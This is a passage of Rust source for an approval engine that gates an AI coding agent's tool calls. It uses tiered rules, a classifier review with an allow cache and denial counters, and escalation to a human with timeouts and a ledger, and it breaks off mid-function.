//! The approval engine: decides each tool call (see the [module docs](super)).
//!
//! [`ApprovalEngine::decide`] classifies the call into a tier, applies the
//! layered rules, reviews Tier-3 calls with the classifier (allow cache,
//! denial counters, pause), and escalates to the human through the
//! [`EscalationBroker`] when auto mode is paused or the classifier fails.
//! Escalations are recorded in the realm's approval store
//! ([`EscalationLedger`]) and time out as denials; a ledger write that fails
//! is a denial too. The engine is shared by every session's
//! [`super::admission::ApprovalGate`].
//!
//! The classifier sees a reasoning-blind transcript per session: the user's
//! own words (recorded under their input key once the runtime admitted them,
//! or seeded from the authoritative session's typed authorship on resume)
//! and prior tool calls with their verdicts, never assistant prose or tool
//! output.
//!
//! # The allow cache
//!
//! A classifier allow is remembered per session under the tool name, the
//! SHA-256 of the canonical arguments and the SHA-256 of the build
//! configuration the classifier was shown. A call that runs an in-project
//! script is never cached (the script may change between calls). The cache
//! of every session is cleared whenever an agent write is allowed (it may
//! change what a cached command does), and a session's cache when its user
//! submits new input (the intent changed). A cache hit does not move the
//! denial counters: only reviewed allows reset them.
//!
//! # Stop
//!
//! A Stop (an interrupt, or the human's Stop answer) applies to the run that
//! was current when it was given: every call of the session that needs
//! review is denied until a run the engine has not seen before starts
//! ([`ApprovalEngine::run_started`]). A late or replayed `RunStarted` of the
//! stopped run, or one without a run id, does not clear it.

use std::collections::{HashMap, HashSet};
use std::fmt;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, OnceLock};
use std::time::Duration;

use meerkat_core::{ApprovalDecision, ApprovalId, RunId, Session, SessionId};
use parking_lot::{MappedMutexGuard, Mutex, MutexGuard, RwLock};
use serde_json::Value;
use serde_json::value::RawValue;
use sha2::{Digest, Sha256};
use tokio::sync::mpsc;

use super::catalog::{ToolOrigin, ToolOrigins};
use super::classifier::{ActionClassifier, ClassifierInput, ClassifierVerdict, Environment};
use super::counters::{AutoMode, AutoModeState, DenialCounters, PauseCause};
use super::escalation::{EscalationBroker, EscalationPrompt, HumanDecision};
use super::ledger::{self, EscalationEntry, EscalationLedger};
use super::policy::{
    Action, ActionKind, Decider, PolicyContext, Tier, TierDecision, classify_tier_with,
};
use super::rules::{self, AutoSettings, Rule, RuleId, RuleOrigin, RuleSet, RulesError};
use super::transcript::{ApprovalTranscript, InputKey};
use super::trust::HostTrustRecord;
use super::{ApprovalEvent, DenyReason, Verdict, prompts, shell};
use crate::paths::ProjectRoot;

/// How long the human has to answer an escalation by default.
pub const DEFAULT_ESCALATION_TIMEOUT: Duration = Duration::from_mins(10);
/// Longest argument preview shown in escalation dialogs.
const ARGS_PREVIEW_BYTES: usize = 2048;
/// Per-file cap for build configuration attached to build commands.
const BUILD_FILE_BYTES: usize = 4 * 1024;
/// Commands whose execution is defined by project files.
const BUILD_RUNNERS: &[&str] = &["cargo", "make", "npm", "pnpm", "yarn", "npx"];
/// Project files that decide what a Rust build executes.
const CARGO_BUILD_FILES: &[&str] = &[
    "build.rs",
    ".cargo/config.toml",
    ".cargo/config",
    "rust-toolchain.toml",
    "rust-toolchain",
];

/// Construction parameters for [`ApprovalEngine`].
pub struct ApprovalConfig {
    /// Canonical project root.
    pub root: ProjectRoot,
    /// Layered rules (sanitized for auto mode on construction).
    pub rules: RuleSet,
    /// Layered settings.
    pub settings: AutoSettings,
    /// Tier-3 reviewer.
    pub classifier: Arc<dyn ActionClassifier>,
    /// Human escalation; `None` ⇒ escalations are denied.
    pub broker: Option<EscalationBroker>,
    /// Record of escalations in the realm's approval store; `None` keeps
    /// none (escalations still reach the human).
    pub ledger: Option<EscalationLedger>,
    /// How long the human has to answer an escalation.
    pub escalation_timeout: Duration,
    /// Environment facts for the classifier.
    pub environment: Environment,
    /// Whether the shell tool runs a POSIX shell.
    pub posix_shell: bool,
    /// UI notifications.
    pub events: mpsc::UnboundedSender<ApprovalEvent>,
    /// Realm rules file; rules added at runtime are persisted here when set.
    pub rules_path: Option<PathBuf>,
    /// The host's trust record: every write of the realm rules file records
    /// the digest of what rkat-tui wrote, so the next start trusts it.
    pub rules_trust: Option<Arc<Mutex<HostTrustRecord>>>,
}

/// One tool call to decide.
#[derive(Debug, Clone, Copy)]
pub struct ToolCall<'a> {
    /// Provider tool-use id.
    pub id: &'a str,
    /// Tool name.
    pub name: &'a str,
    /// Raw arguments as the model sent them.
    pub args: &'a RawValue,
    /// Where the session's tool of this name comes from (`None`: unknown).
    pub origin: Option<&'a ToolOrigin>,
}

/// On whose behalf a tool call is decided.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Caller<'a> {
    /// The session whose user's intent the call is judged against (a
    /// helper's calls are attributed to the session that delegated to it).
    pub session_id: &'a SessionId,
    /// The helper making the call (`None`: the session's own agent).
    pub agent: Option<&'a str>,
}

impl<'a> Caller<'a> {
    /// The session's own agent.
    #[must_use]
    pub fn session(session_id: &'a SessionId) -> Self {
        Self {
            session_id,
            agent: None,
        }
    }

    /// A helper (`agent`) working for `session_id`.
    #[must_use]
    pub fn helper(session_id: &'a SessionId, agent: &'a str) -> Self {
        Self {
            session_id,
            agent: Some(agent),
        }
    }
}

/// Allow-cache key: tool name, SHA-256 of the canonical arguments, SHA-256
/// of the build configuration the classifier saw (zero when none).
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
struct CacheKey {
    tool: String,
    args: [u8; 32],
    payload: [u8; 32],
}

/// Whether review is stopped for a session.
#[derive(Debug, Clone, PartialEq, Eq)]
enum StopState {
    /// Calls are reviewed normally.
    Running,
    /// Stopped until a run other than this one starts (`None` inside: the
    /// stop was given before any run id was known).
    Stopped(Option<RunId>),
}

/// Everything the engine keeps per session.
#[derive(Debug)]
struct SessionState {
    transcript: ApprovalTranscript,
    allow_cache: HashSet<CacheKey>,
    stop: StopState,
    /// Every run id seen starting, so a replayed start is recognised.
    runs_seen: HashSet<RunId>,
    current_run: Option<RunId>,
    /// Project files (display paths) whose writes were allowed for this
    /// session, in first-write order: shown to the classifier as
    /// agent-authored.
    agent_written: Vec<String>,
}

impl Default for SessionState {
    fn default() -> Self {
        Self {
            transcript: ApprovalTranscript::default(),
            allow_cache: HashSet::new(),
            stop: StopState::Running,
            runs_seen: HashSet::new(),
            current_run: None,
            agent_written: Vec::new(),
        }
    }
}

/// Why `/rules trust` failed.
#[derive(Debug, thiserror::Error)]
pub enum TrustRulesError {
    /// This run keeps no realm rules file.
    #[error("there is no realm rules file to trust")]
    NoRealmFile,
    /// The file cannot be read or parsed.
    #[error(transparent)]
    Rules(#[from] RulesError),
    /// The file cannot be trusted or the record not saved.
    #[error(transparent)]
    Trust(#[from] super::trust::TrustError),
}

/// A callback run when a session's per-session state is forgotten.
pub type ForgetHook = Arc<dyn Fn(&SessionId) + Send + Sync>;

/// The approval engine, shared behind an [`Arc`] by every session's gate.
pub struct ApprovalEngine {
    root: ProjectRoot,
    rules: RwLock<RuleSet>,
    settings: RwLock<AutoSettings>,
    sessions: Mutex<HashMap<SessionId, SessionState>>,
    auto: Mutex<AutoMode>,
    classifier: Arc<dyn ActionClassifier>,
    broker: Option<EscalationBroker>,
    ledger: Option<EscalationLedger>,
    escalation_timeout: Duration,
    next_escalation: AtomicU64,
    environment: Environment,
    posix_shell: bool,
    events: mpsc::UnboundedSender<ApprovalEvent>,
    rules_path: Option<PathBuf>,
    rules_trust: Option<Arc<Mutex<HostTrustRecord>>>,
    origins: OnceLock<Arc<dyn ToolOrigins>>,
    /// Called by [`Self::forget_session`] (helper hosts prune their state).
    forget_hooks: RwLock<Vec<ForgetHook>>,
}

impl fmt::Debug for ApprovalEngine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("ApprovalEngine")
            .field("root", &self.root)
            .field("settings", &*self.settings.read())
            .field("auto", &*self.auto.lock())
            .finish_non_exhaustive()
    }
}

/// Decision-time facts about one call, computed once.
struct Facts<'a> {
    action: Action<'a>,
    subjects: Vec<String>,
}

impl ApprovalEngine {
    /// Build the engine. Broad allow rules are dropped and reported once via
    /// [`ApprovalEvent::RulesDropped`].
    #[must_use]
    pub fn new(config: ApprovalConfig) -> Arc<Self> {
        let ApprovalConfig {
            root,
            mut rules,
            settings,
            classifier,
            broker,
            ledger,
            escalation_timeout,
            environment,
            posix_shell,
            events,
            rules_path,
            rules_trust,
        } = config;
        let dropped = rules.sanitize_for_auto();
        if !dropped.is_empty() {
            let _ = events.send(ApprovalEvent::RulesDropped(dropped));
        }
        let auto = AutoMode::new(settings.enabled);
        Arc::new(Self {
            root,
            rules: RwLock::new(rules),
            settings: RwLock::new(settings),
            sessions: Mutex::new(HashMap::new()),
            auto: Mutex::new(auto),
            classifier,
            broker,
            ledger,
            escalation_timeout,
            next_escalation: AtomicU64::new(1),
            environment,
            posix_shell,
            events,
            rules_path,
            rules_trust,
            origins: OnceLock::new(),
            forget_hooks: RwLock::new(Vec::new()),
        })
    }

    /// The project root.
    #[must_use]
    pub fn root(&self) -> &ProjectRoot {
        &self.root
    }

    /// Current settings.
    #[must_use]
    pub fn settings(&self) -> AutoSettings {
        self.settings.read().clone()
    }

    /// Current rules.
    #[must_use]
    pub fn rules(&self) -> RuleSet {
        self.rules.read().clone()
    }

    /// Current counters and state.
    #[must_use]
    pub fn auto_state(&self) -> (DenialCounters, AutoModeState) {
        let auto = self.auto.lock();
        (auto.counters, auto.state)
    }

    /// The escalation ledger, when one is kept.
    #[must_use]
    pub fn ledger(&self) -> Option<&EscalationLedger> {
        self.ledger.as_ref()
    }

    /// Where the gates learn each session's tool definitions (set once,
    /// after the service exists). Until it is set, and for a session whose
    /// definitions cannot be read, every call is judged as a foreign tool.
    /// Returns `false` when origins were already set.
    pub fn set_tool_origins(&self, origins: Arc<dyn ToolOrigins>) -> bool {
        self.origins.set(origins).is_ok()
    }

    /// The origin of `name` among `session_id`'s live tools.
    pub async fn tool_origin(&self, session_id: &SessionId, name: &str) -> Option<ToolOrigin> {
        let origins = self.origins.get()?;
        origins.catalog(session_id).await?.get(name).cloned()
    }

    fn session(&self, session_id: &SessionId) -> MappedMutexGuard<'_, SessionState> {
        MutexGuard::map(self.sessions.lock(), |sessions| {
            sessions.entry(session_id.clone()).or_default()
        })
    }

    /// Rendered approval transcript for a session (diagnostics and tests).
    #[must_use]
    pub fn transcript(&self, session_id: &SessionId) -> Option<String> {
        self.sessions
            .lock()
            .get(session_id)
            .map(|state| state.transcript.render())
    }

    /// Adopt a session this process opened from its authoritative history
    /// (on resume): seed its transcript from typed authorship (the human's
    /// turn inputs and tool calls, never assistant prose, tool output or
    /// peer messages), and deny the escalation records an earlier process
    /// left pending for it.
    pub fn seed_transcript(&self, session: &Session) {
        let mut transcript = ApprovalTranscript::default();
        transcript.seed_from_session(session);
        self.session(session.id()).transcript = transcript;
        if let Some(ledger) = &self.ledger {
            match ledger.deny_leftovers(session.id()) {
                Ok(0) => {}
                Ok(n) => tracing::info!(
                    session = %session.id(),
                    denied = n,
                    "denied escalations left pending by an earlier run"
                ),
                Err(err) => self.emit(ApprovalEvent::Notice(format!(
                    "cannot settle approval requests an earlier run left pending: {err}"
                ))),
            }
        }
    }

    /// Record words the human submitted to a session (a prompt or a steer)
    /// that the runtime admitted under the caller idempotency key `key`.
    /// The session's allow cache is cleared: the intent changed.
    ///
    /// Does not clear a previous Stop: only a new run does that
    /// ([`Self::run_started`]).
    pub fn record_user_input(&self, session_id: &SessionId, key: InputKey, text: &str) {
        let mut state = self.session(session_id);
        state.transcript.push_user_input(key, text);
        state.allow_cache.clear();
    }

    /// Forget the input admitted under `key` (it was cancelled before the
    /// model saw it). Returns whether it was recorded.
    pub fn forget_user_input(&self, session_id: &SessionId, key: &InputKey) -> bool {
        self.sessions
            .lock()
            .get_mut(session_id)
            .is_some_and(|state| state.transcript.forget_user_input(key))
    }

    /// Transitional: record `prompt` without an input key. Use
    /// [`Self::record_user_input`] after admission instead.
    pub fn record_prompt(&self, session_id: &SessionId, prompt: &str) {
        let mut state = self.session(session_id);
        state.transcript.push_user(prompt);
        state.allow_cache.clear();
    }

    /// Transitional: forget the most recent user entry equal to `prompt`.
    /// Use [`Self::forget_user_input`] instead.
    pub fn forget_prompt(&self, session_id: &SessionId, prompt: &str) -> bool {
        self.sessions
            .lock()
            .get_mut(session_id)
            .is_some_and(|state| state.transcript.forget_user(prompt))
    }

    /// A run of `session_id` started. It clears a Stop only when it carries
    /// a run id the engine has not seen start before; a replayed or late
    /// start of a known run, or a start without an id, leaves the Stop.
    pub fn run_started(&self, session_id: &SessionId, run_id: Option<&RunId>) {
        let mut state = self.session(session_id);
        let Some(run_id) = run_id else {
            return;
        };
        if !state.runs_seen.insert(run_id.clone()) {
            return;
        }
        state.current_run = Some(run_id.clone());
        let clears = match &state.stop {
            StopState::Running => false,
            StopState::Stopped(stopped) => stopped.as_ref() != Some(run_id),
        };
        if clears {
            state.stop = StopState::Running;
        }
    }

    /// Transitional: a run started without its id known. Use
    /// [`Self::run_started`] with the event's run id: this one never clears
    /// a Stop.
    pub fn on_run_started(&self, session_id: &SessionId) {
        self.run_started(session_id, None);
    }

    /// The human stopped `session_id`'s current run (an interrupt or a Stop
    /// answer): every call of that session that needs review is denied,
    /// without asking anyone, until a new run starts ([`Self::run_started`]).
    pub fn stop(&self, session_id: &SessionId) {
        let mut state = self.session(session_id);
        state.stop = StopState::Stopped(state.current_run.clone());
    }

    fn stopped(&self, session_id: &SessionId) -> bool {
        self.sessions
            .lock()
            .get(session_id)
            .is_some_and(|state| state.stop != StopState::Running)
    }

    /// Forget a session's per-session state (transcript, allow cache, stop,
    /// agent-written files) and run every [`ForgetHook`]. Idempotent:
    /// forgetting an unknown or already forgotten session only runs the
    /// hooks, which must be idempotent too.
    pub fn forget_session(&self, session_id: &SessionId) {
        self.sessions.lock().remove(session_id);
        let hooks = self.forget_hooks.read().clone();
        for hook in hooks {
            hook(session_id);
        }
    }

    /// Run `hook` whenever a session is forgotten ([`Self::forget_session`]).
    pub fn add_forget_hook(&self, hook: ForgetHook) {
        self.forget_hooks.write().push(hook);
    }

    /// Add a rule, persisting it to the realm rules file when configured.
    ///
    /// # Errors
    ///
    /// Returns [`RulesError`] when persistence fails (the rule stays active).
    pub fn add_rule(&self, rule: Rule) -> Result<(), RulesError> {
        let snapshot = self.push_rule(rule);
        self.persist(&snapshot)
    }

    fn push_rule(&self, mut rule: Rule) -> RuleSet {
        if self.rules_path.is_some() {
            rule.origin = RuleOrigin::Realm;
        }
        let mut rules = self.rules.write();
        rules.push(rule);
        rules.clone()
    }

    /// `/rules trust`: trust the realm rules file as it is now. Records its
    /// digest in the host trust record and applies its allow rules from now
    /// on (its `[auto]`, endpoints and prices apply from the next start).
    /// Returns a summary of what was trusted, for the human to see.
    ///
    /// # Errors
    ///
    /// [`TrustRulesError`] when there is no realm rules file, it cannot be
    /// read, or it cannot be trusted (symlinked, not a regular file).
    pub fn trust_realm_rules(&self) -> Result<String, TrustRulesError> {
        let (Some(path), Some(trust)) = (&self.rules_path, &self.rules_trust) else {
            return Err(TrustRulesError::NoRealmFile);
        };
        let file = rules::RulesFile::load(path)?;
        trust.lock().record_file(path)?;
        let summary = rules::summarize(path, &file);
        let mut added = 0;
        {
            let mut set = self.rules.write();
            for rule in file.rules(RuleOrigin::Realm)? {
                if rule.kind == rules::RuleKind::Allow && rule.broad_reason().is_none() {
                    set.push(rule);
                    added += 1;
                }
            }
        }
        Ok(format!(
            "{summary}\ntrusted; {added} allow rule(s) apply now, its [auto] settings, endpoints and prices from the next start"
        ))
    }

    /// Remove a rule (global and project rules are removed for this process only).
    ///
    /// # Errors
    ///
    /// Returns [`RulesError`] when persistence fails.
    pub fn remove_rule(&self, id: RuleId) -> Result<Option<Rule>, RulesError> {
        let (removed, snapshot) = {
            let mut rules = self.rules.write();
            let removed = rules.remove(id);
            (removed, rules.clone())
        };
        if removed.is_some() {
            self.persist(&snapshot)?;
        }
        Ok(removed)
    }

    fn persist(&self, rules: &RuleSet) -> Result<(), RulesError> {
        match &self.rules_path {
            Some(path) => persist_trusted(path, rules, self.rules_trust.as_ref()),
            None => Ok(()),
        }
    }

    /// [`Self::persist`] off the async executor (the escalation path).
    async fn persist_blocking(&self, rules: RuleSet) -> Result<(), String> {
        let Some(path) = self.rules_path.clone() else {
            return Ok(());
        };
        let trust = self.rules_trust.clone();
        match tokio::task::spawn_blocking(move || persist_trusted(&path, &rules, trust.as_ref()))
            .await
        {
            Ok(Ok(())) => Ok(()),
            Ok(Err(err)) => Err(err.to_string()),
            Err(err) => Err(err.to_string()),
        }
    }

    /// Turn auto mode on (`/auto on`, resets counters) or off (`/auto off`:
    /// Tier-3 actions are denied outright).
    pub fn set_enabled(&self, enabled: bool) {
        self.settings.write().enabled = enabled;
        let event = {
            let mut auto = self.auto.lock();
            if enabled {
                auto.resume(true).then_some(ApprovalEvent::Resumed)
            } else {
                auto.pause(PauseCause::UserDisabled)
                    .then_some(ApprovalEvent::Paused(PauseCause::UserDisabled))
            }
        };
        if let Some(event) = event {
            self.emit(event);
        }
    }

    /// `/auto resume`: clear a pause (including the total-denials pause) and reset counters.
    pub fn resume_auto(&self) {
        let resumed = self.auto.lock().resume(true);
        if resumed {
            self.emit(ApprovalEvent::Resumed);
        }
    }

    fn emit(&self, event: ApprovalEvent) {
        let _ = self.events.send(event);
    }

    /// Decide one tool call of `session_id`'s own agent.
    pub async fn decide(&self, session_id: &SessionId, call: ToolCall<'_>) -> Verdict {
        self.decide_as(Caller::session(session_id), call).await
    }

    /// Decide one tool call made on behalf of `caller.session_id`: by its own
    /// agent, or by a helper it delegated to ([`Caller::agent`]). A helper's
    /// call is judged exactly like the session's own: against the session's
    /// transcript (the user's words; the helper's task text is
    /// assistant-authored and never recorded as user intent), its allow
    /// cache, its Stop and the shared denial counters. The escalation dialog
    /// and the decision event name the helper. Records the call in the
    /// session's approval transcript and emits an [`ApprovalEvent::Decision`].
    pub async fn decide_as(&self, caller: Caller<'_>, call: ToolCall<'_>) -> Verdict {
        let Caller { session_id, agent } = caller;
        let action = Action::parse(call.name, call.args, call.origin);
        let subjects = action.subjects(&self.root);
        let facts = Facts { action, subjects };
        let verdict = self.evaluate(session_id, agent, call.id, &facts).await;
        let (tier, reason) = match &verdict {
            Verdict::Allow { tier, .. } => (*tier, None),
            Verdict::Deny { tier, reason } => (*tier, Some(reason.to_string())),
        };
        if verdict.is_allowed() {
            self.record_agent_writes(session_id, &facts);
        }
        let summary = verdict.summary();
        self.session(session_id).transcript.push_tool_call(
            call.id,
            call.name,
            call.args,
            Some(summary),
        );
        tracing::debug!(tool = call.name, %tier, ?summary, "auto-mode decision");
        self.emit(ApprovalEvent::Decision {
            session_id: session_id.clone(),
            agent: agent.map(str::to_string),
            tool_use_id: call.id.to_string(),
            tool: call.name.to_string(),
            tier,
            verdict: summary,
            reason,
        });
        verdict
    }

    /// Remember the files an allowed write targets, and drop every cached
    /// classifier allow (a write may change what a cached command does).
    /// Recorded at approval time (before the tool runs): a write that then
    /// fails stays listed, which only makes the classifier more careful.
    fn record_agent_writes(&self, session_id: &SessionId, facts: &Facts<'_>) {
        if !matches!(facts.action.kind, ActionKind::FileWrite { .. }) {
            return;
        }
        let mut sessions = self.sessions.lock();
        for state in sessions.values_mut() {
            state.allow_cache.clear();
        }
        let state = sessions.entry(session_id.clone()).or_default();
        for subject in &facts.subjects {
            if !state.agent_written.contains(subject) {
                state.agent_written.push(subject.clone());
            }
        }
    }

    /// Project files the agent of `session_id` was allowed to write, oldest
    /// first (a borrowed view; empty for an unknown session).
    pub fn agent_written(&self, session_id: &SessionId) -> MappedMutexGuard<'_, [String]> {
        MutexGuard::map(self.sessions.lock(), |sessions| {
            match sessions.get_mut(session_id) {
                Some(state) => state.agent_written.as_mut_slice(),
                None => &mut [],
            }
        })
    }

    fn tier_of(&self, facts: &Facts<'_>) -> TierDecision {
        let trust_project_builds = self.settings.read().trust_project_builds;
        let ctx = PolicyContext {
            root: &self.root,
            trust_project_builds,
            posix_shell: self.posix_shell,
        };
        classify_tier_with(&facts.action, &facts.subjects, &self.rules.read(), &ctx)
    }

    /// Verdict for tiers 0–2; `None` for Tier 3.
    fn static_verdict(&self, decision: TierDecision) -> Option<Verdict> {
        match decision.tier {
            Tier::UserDeny => {
                let id = decision.rule?;
                let rule = self
                    .rules
                    .read()
                    .get(id)
                    .map(describe_rule)
                    .unwrap_or_default();
                Some(Verdict::Deny {
                    tier: Tier::UserDeny,
                    reason: DenyReason::UserRule { id, rule },
                })
            }
            Tier::Sealed => Some(Verdict::Deny {
                tier: Tier::Sealed,
                reason: DenyReason::Sealed {
                    detail: decision.detail,
                },
            }),
            Tier::AlwaysAllow | Tier::InProjectEdit => Some(Verdict::Allow {
                tier: decision.tier,
                by: Decider::Policy,
                why: decision.detail,
            }),
            Tier::Classifier => None,
        }
    }

    async fn evaluate(
        &self,
        session_id: &SessionId,
        agent: Option<&str>,
        tool_use_id: &str,
        facts: &Facts<'_>,
    ) -> Verdict {
        if let Some(verdict) = self.static_verdict(self.tier_of(facts)) {
            return verdict;
        }
        if self.stopped(session_id) {
            return deny3(DenyReason::Stopped);
        }
        let (disabled, escalating) = {
            let auto = self.auto.lock();
            (auto.disabled(), auto.escalating())
        };
        if disabled {
            return deny3(DenyReason::AutoDisabled);
        }

        let payload = self.payload(&facts.action).await;
        let key = payload.cache_key(&facts.action);
        if !escalating
            && let Some(key) = &key
            && self.session(session_id).allow_cache.contains(key)
        {
            // A cache hit leaves the denial counters alone.
            return allow3(Decider::Classifier, "previously allowed by the classifier");
        }

        let result = self.classify(session_id, &facts.action, &payload).await;

        if escalating {
            let hint = match &result {
                Ok(v) => format!("classifier: {v}"),
                Err(e) => format!("classifier error: {e}"),
            };
            let fallback = result.ok();
            return self
                .escalate(session_id, agent, tool_use_id, facts, hint, fallback)
                .await;
        }

        match result {
            Ok(verdict) => self.apply_classifier(session_id, verdict, key),
            Err(err) => {
                tracing::warn!(error = %err, tool = facts.action.name, "classifier failed; escalating");
                if self.broker.is_some() {
                    self.escalate(
                        session_id,
                        agent,
                        tool_use_id,
                        facts,
                        format!("classifier error: {err}"),
                        None,
                    )
                    .await
                } else {
                    deny3(DenyReason::ClassifierUnavailable(err.to_string()))
                }
            }
        }
    }

    /// Act on a classifier verdict outside an escalation.
    fn apply_classifier(
        &self,
        session_id: &SessionId,
        verdict: ClassifierVerdict,
        key: Option<CacheKey>,
    ) -> Verdict {
        match verdict {
            ClassifierVerdict::Allow => {
                if let Some(key) = key {
                    self.session(session_id).allow_cache.insert(key);
                }
                self.auto.lock().record_allow();
                allow3(Decider::Classifier, "allowed by the classifier")
            }
            ClassifierVerdict::Block { rule, reason } => {
                let paused = self.auto.lock().record_classifier_deny();
                if let Some(cause) = paused {
                    self.emit(ApprovalEvent::Paused(cause));
                }
                deny3(DenyReason::Classifier {
                    rule,
                    explanation: reason,
                })
            }
        }
    }

    /// Run the classifier on `action` with the session's transcript.
    async fn classify(
        &self,
        session_id: &SessionId,
        action: &Action<'_>,
        payload: &Payload,
    ) -> Result<ClassifierVerdict, super::classifier::ClassifierError> {
        let (transcript, agent_written) = {
            let state = self.session(session_id);
            (state.transcript.clone(), state.agent_written.clone())
        };
        let args: Value = serde_json::from_str(action.args.get())
            .unwrap_or_else(|_| Value::String(action.args.get().to_string()));
        let script = payload.combined();
        let input = ClassifierInput {
            environment: &self.environment,
            transcript: &transcript,
            tool: action.name,
            args: &args,
            script_payload: script.as_deref(),
            agent_written: &agent_written,
        };
        self.emit(ApprovalEvent::Classifying(true));
        let result = self.classifier.classify(input).await;
        self.emit(ApprovalEvent::Classifying(false));
        result
    }

    /// Put a call to the human. Waiting for the serial lock and for the
    /// answer share one escalation timeout; after the lock is acquired the
    /// Stop, the rules, auto mode and the pause are checked again (they may
    /// have changed while other dialogs were open): a call whose pause has
    /// ended meanwhile gets the classifier's `fallback` verdict instead. A
    /// ledger write that fails denies the call.
    async fn escalate(
        &self,
        session_id: &SessionId,
        agent: Option<&str>,
        tool_use_id: &str,
        facts: &Facts<'_>,
        hint: String,
        fallback: Option<ClassifierVerdict>,
    ) -> Verdict {
        let Some(broker) = &self.broker else {
            return deny3(DenyReason::ClassifierUnavailable(
                "no human is available to review this action".to_string(),
            ));
        };
        let id = self.next_escalation.fetch_add(1, Ordering::Relaxed);
        let mut pending = PendingEscalation {
            engine: self,
            id,
            record: None,
            settled: false,
        };
        let asked = tokio::time::timeout(self.escalation_timeout, async {
            let guard = broker.serial().await;
            if self.stopped(session_id) {
                return Asked::Settled(deny3(DenyReason::Stopped));
            }
            if let Some(verdict) = self.static_verdict(self.tier_of(facts)) {
                return Asked::Settled(verdict);
            }
            let (disabled, escalating) = {
                let auto = self.auto.lock();
                (auto.disabled(), auto.escalating())
            };
            if disabled {
                return Asked::Settled(deny3(DenyReason::AutoDisabled));
            }
            if !escalating && let Some(verdict) = fallback.clone() {
                return Asked::Settled(self.apply_classifier(session_id, verdict, None));
            }
            match self
                .record_request(session_id, tool_use_id, facts, &hint)
                .await
            {
                Ok(record) => pending.record = record,
                Err(err) => return Asked::Settled(self.ledger_failed(err)),
            }
            let prompt = EscalationPrompt {
                id,
                session_id: session_id.clone(),
                agent: agent.map(str::to_string),
                tool: facts.action.name.to_string(),
                args_preview: args_preview(&facts.action),
                subjects: facts.subjects.clone(),
                classifier_hint: Some(hint.clone()),
            };
            let answer = broker.ask_locked(&guard, prompt).await;
            // A Stop applies before the serial lock is released, so an
            // escalation queued behind this one sees it.
            if matches!(answer, HumanDecision::Stop) {
                self.stop(session_id);
            }
            Asked::Answered(answer)
        })
        .await;
        let decision = match asked {
            Err(_) => {
                pending.settle_without_human("nobody answered in time").await;
                return deny3(DenyReason::EscalationTimedOut);
            }
            Ok(Asked::Settled(verdict)) => {
                pending.settled = true;
                return verdict;
            }
            Ok(Asked::Answered(decision)) => decision,
        };
        match decision {
            HumanDecision::AllowOnce => {
                if let Err(err) = pending
                    .settle(ApprovalDecision::Approve, "allowed once")
                    .await
                {
                    return self.ledger_failed(err);
                }
                self.human_allowed();
                allow3(Decider::Human, "allowed once by the user")
            }
            HumanDecision::AllowAndAddRule(rule) => {
                if let Err(err) = pending
                    .settle(ApprovalDecision::Approve, "allowed; allow rule added")
                    .await
                {
                    return self.ledger_failed(err);
                }
                let snapshot = self.push_rule(*rule);
                if let Err(err) = self.persist_blocking(snapshot).await {
                    tracing::warn!(error = %err, "failed to persist rule");
                    self.emit(ApprovalEvent::Notice(format!(
                        "the allow rule is active for this run but was not saved: {err}"
                    )));
                }
                self.human_allowed();
                allow3(Decider::Human, "allowed by the user (rule added)")
            }
            HumanDecision::Deny => {
                // A denial stands whether or not it could be recorded.
                let _ = pending.settle(ApprovalDecision::Deny, "denied").await;
                deny3(DenyReason::Human)
            }
            HumanDecision::Stop => {
                let _ = pending
                    .settle(ApprovalDecision::Deny, "denied; turn stopped")
                    .await;
                deny3(DenyReason::Stopped)
            }
        }
    }

    /// Record the escalation request in the ledger (off the executor).
    /// `Ok(None)` when no ledger is kept.
    async fn record_request(
        &self,
        session_id: &SessionId,
        tool_use_id: &str,
        facts: &Facts<'_>,
        hint: &str,
    ) -> Result<Option<ApprovalId>, String> {
        let Some(ledger) = &self.ledger else {
            return Ok(None);
        };
        let request = EscalationLedger::prepare(EscalationEntry {
            session_id,
            tool_use_id,
            action: &facts.action,
            timeout: self.escalation_timeout,
            hint: Some(hint),
        })
        .map_err(|e| e.to_string())?;
        let ledger = ledger.clone();
        match tokio::task::spawn_blocking(move || ledger.submit(request)).await {
            Ok(Ok(id)) => Ok(Some(id)),
            Ok(Err(err)) => Err(err.to_string()),
            Err(err) => Err(err.to_string()),
        }
    }

    /// The ledger failed: deny, and tell the human why.
    fn ledger_failed(&self, err: String) -> Verdict {
        tracing::warn!(error = %err, "approval ledger write failed; denying");
        self.emit(ApprovalEvent::Notice(format!(
            "an approval request could not be recorded, so the action was denied: {err}"
        )));
        deny3(DenyReason::LedgerUnavailable(err))
    }

    fn human_allowed(&self) {
        let resumed = {
            let mut auto = self.auto.lock();
            auto.record_allow();
            auto.resume(false)
        };
        if resumed {
            self.emit(ApprovalEvent::Resumed);
        }
    }

    /// Extra content for the classifier: the script a shell command runs and,
    /// for build commands, the project files that decide what the build runs.
    async fn payload(&self, action: &Action<'_>) -> Payload {
        let ActionKind::Shell {
            command,
            working_dir,
            ..
        } = &action.kind
        else {
            return Payload::default();
        };
        Payload {
            script: self.script_content(command, working_dir.as_deref()).await,
            build: self.build_context(command).await,
        }
    }

    async fn script_content(&self, command: &str, working_dir: Option<&str>) -> Option<String> {
        let script = shell::script_path(command)?;
        let joined = match working_dir {
            Some(dir) if !script.starts_with('/') => format!("{dir}/{script}"),
            _ => script,
        };
        let resolved = self.root.resolve(&joined).ok()?;
        if !resolved.inside() {
            return None;
        }
        let bytes = read_capped(resolved.abs, prompts::MAX_SCRIPT_BYTES).await?;
        Some(String::from_utf8_lossy(&bytes).into_owned())
    }

    /// Labelled contents of the build configuration files a build command
    /// would execute, each capped at [`BUILD_FILE_BYTES`], in total at
    /// [`prompts::MAX_BUILD_CONTEXT_BYTES`].
    async fn build_context(&self, command: &str) -> Option<String> {
        let runners = build_runners(command);
        if runners.is_empty() {
            return None;
        }
        let mut files: Vec<&str> = CARGO_BUILD_FILES.to_vec();
        if runners.contains(&"make") {
            files.extend(["Makefile", "makefile", "GNUmakefile"]);
        }
        if runners
            .iter()
            .any(|r| matches!(*r, "npm" | "pnpm" | "yarn" | "npx"))
        {
            files.push("package.json");
        }
        let mut out = String::new();
        for file in files {
            let Ok(resolved) = self.root.resolve(file) else {
                continue;
            };
            if !resolved.inside() {
                continue;
            }
            let budget = prompts::MAX_BUILD_CONTEXT_BYTES.saturating_sub(out.len());
